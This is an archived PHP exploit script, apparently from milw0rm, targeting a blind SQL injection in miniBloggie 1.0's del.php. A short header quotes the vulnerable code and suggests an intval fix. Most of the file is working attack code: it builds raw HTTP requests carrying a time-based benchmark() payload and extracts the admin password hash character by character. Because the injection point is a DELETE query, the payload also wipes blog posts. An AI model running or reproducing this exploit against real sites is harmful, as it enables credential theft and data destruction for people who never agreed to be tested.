<html><head><title>miniBloggie 1.0 (del.php) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/php 
&lt;?php

error_reporting(0);


/*
   miniBloggie 1.0 (del.php) Remote Blind SQL Injection Exploit
   ------------------------------------------------------------
   Author -&gt; StAkeR aka athos - StAkeR[at]hotmail[dot]it
   Date   -&gt; 18/10/2008
   Get    -&gt; http://www.mywebland.com/dl.php?id=2
   ------------------------------------------------------------
   
   File del.php
   
   25. if (isset($_GET['post_id'])) $post_id = $_GET['post_id'];
   26. if (isset($_GET['confirm'])) $confirm = $_GET['confirm'];
   27.
   28. if ($confirm==&quot;&quot;) {   
   29. notice(&quot;Confirmation&quot;, &quot;Warning : Do you want to delete this post ? &lt;a href=del.php?post_id=&quot;.$post_id.&quot;&amp;confirm=yes&gt;Yes&lt;/a&gt;&quot;);
   30. }
   31. elseif ($confirm==&quot;yes&quot;) {
   32. // Data Base Connection  //
   33. dbConnect();
   34. $sql = &quot;DELETE FROM blogdata WHERE post_id=$post_id&quot;;
   35. $query = mysql_query($sql) or die(&quot;Cannot query the database.&lt;br&gt;&quot; . mysql_error());
   36. $confirm =&quot;&quot;;
   37. notice(&quot;Del Post&quot;, &quot;Data Deleted&quot;);
   38. }
   39. else notice( &quot;Delete Error, Unable to complete the task !&quot; );
   40. ?&gt;

   NOTE:
   
   $sql = &quot;DELETE FROM blogdata WHERE post_id=$post_id&quot;;
   
   $post_id isn't escaped so you can execute SQL Code 
   
   How to fix? sanize $post_id with intval or int (PHP Functions)
   
  
*/  



function get($host,$path,$evil)
{
  if(!preg_match('/\w:[0-9]/i',$host)) alert();
  $inet = explode(':',$host);

  if(!$sock = fsockopen($inet[0],$inet[1])) die('connection refused');
  
  $data .= &quot;GET /$path/del.php?post_id={$evil}&amp;confirm=yes HTTP/1.1\r\n&quot;;
  $data .= &quot;Host: $host[0]\r\n&quot;;
  $data .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
  $data .= &quot;Connection: close\r\n\r\n&quot;;
  
  fputs($sock,$data);
  
  while(!feof($sock)) { $html .= fgets($sock); }
  fclose($sock);
  
  return $html;
}


function alert()
{
  echo &quot;# miniBloggie 1.0 (del.php) Remote Blind SQL Injection Exploit\r\n&quot;;
  echo &quot;# Usage: php {$argv[0]} [host:port] [path] [user_id]\r\n&quot;;
  echo &quot;# Usage: php {$argv[0]} localhost:80 /minibloggie 1\r\n&quot;;
  die;
}


function charme($char,$colum,$id)
{
  $sql = &quot;1 or (select if((ascii(substring(password&quot;.
         &quot;,$colum,1))=$char),benchmark(200000000,char(0)),0)&quot;.
         &quot; from blogusername where id=$id)#&quot;;
  
  return urlencode($sql);
}


$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$c = 0;


for($i=0;$i&lt;=32;$i++)
{
  for($j=0;$j&lt;=17;$j++)
  {
    $start = time();
    
    get($argv[1],$argv[2],charme($hash[$j],$c,intval($argv[3])));
    
    $stop = time();
    
    if($stop - $start &gt; 12)
    {
      $password .= chr($hash[$j]);
      $c++;;
      break;
    }
  }
}

if(isset($password))
{
  echo &quot;# Hash: $password\r\n&quot;;
  die;
}
else
{
  echo &quot;# Exploit Failed!\r\n&quot;;
}
    



?&gt;

# milw0rm.com [2008-10-18]</pre></html>